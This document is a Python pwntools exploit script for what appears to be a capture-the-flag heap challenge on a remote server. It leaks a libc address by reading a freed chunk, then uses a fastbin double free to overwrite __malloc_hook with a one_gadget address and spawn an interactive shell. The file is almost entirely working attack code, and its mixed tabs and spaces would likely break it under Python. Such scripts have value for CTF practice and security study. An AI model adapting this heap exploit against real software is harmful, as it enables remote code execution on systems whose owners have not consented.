from pwn import *

def add_memo(size, content):
	print p.recv()
	p.send("4")
	print p.recv()
        p.send(str(size))
        print p.recv()
        p.send(str(content))

def delete_memo(idx):
	print p.recv()
	p.send("5")
	print p.recv()
	p.send(str(idx))

def view_memo(idx):
	print p.recv()
	p.send("6")
	print p.recv()
	p.send(str(idx))

def ex():
	print p.recv()
        p.send("4")
        print p.recv()
        p.send(str(10))
	

e = ELF("/lib/x86_64-linux-gnu/libc.so.6")

size1 = 0x60
size2 = 0x80
p = connect("ctf.udpms.com", 8585)
#p = process("./binary")

add_memo(size2,"0")
add_memo(size2,"1")
add_memo(size2,"2")

delete_memo(1)
view_memo(1)
print p.recvuntil("memo  : ")
main_arena = u64(p.recvline().replace("==================","")[:-1] + "\x00"*2)
malloc_hook = main_arena - 88 - 16
libc_base = main_arena - 0x3c4b78
log.info("main_arena  = " + hex(main_arena))
log.info("malloc_hook = " + hex(malloc_hook))
log.info("libc base   = " + hex(libc_base))

delete_memo(2)
delete_memo(0)

add_memo(size1,"0")
add_memo(size1,"4")

delete_memo(0)
delete_memo(4)
delete_memo(0)          # free list : 0 - 4 - 0

rip = libc_base + 0xf1117#0xf0274
alloc_addr = malloc_hook - 0x13
add_memo(size1,p64(alloc_addr))
add_memo(size1,"b"*16)
add_memo(size1,"c"*16)
add_memo(size1,"a"*3 + p64(rip))

p.interactive()


